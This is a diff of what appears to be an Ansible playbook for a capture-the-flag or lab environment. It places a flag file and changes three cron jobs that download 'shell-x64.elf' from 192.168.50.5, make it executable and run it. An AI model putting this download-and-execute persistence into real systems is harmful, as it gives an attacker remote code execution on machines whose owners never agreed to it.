@@ -12,7 +12,7 @@
 
 - name: Place flag
   copy:
-    dest: '/home/server/flag.txt'
+    dest: '/home/user/flag.txt'
     owner: 'server'
     content: "Top_Secret_Flag\n"
     mode: '0600'
@@ -26,21 +26,18 @@
   cron:
    name: "hack file get"
    minute: "1"
-   user: server
-   job: "sudo wget -O /home/server/shell-x64.elf http://192.168.50.5/shell-x64.elf"
+   job: "wget -O /home/user/shell-x64.elf http://192.168.50.5/shell-x64.elf"
 
 - name: Cron job make malicious file executable
   cron:
    name: "hack file executable"
-   minute: "1"
-   user: server
-   job: "sudo chmod +x /home/server/shell-x64.elf"
+   minute: "2"
+   job: "chmod +x /home/user/shell-x64.elf"
 
 - name: Cron job for run malicious file
   cron:
    name: "hack file run"
-   minute: "1"
-   user: server
-   job: "sudo /home/server/shell-x64.elf"
+   minute: "3"
+   job: "/home/user/shell-x64.elf"
 
 ...
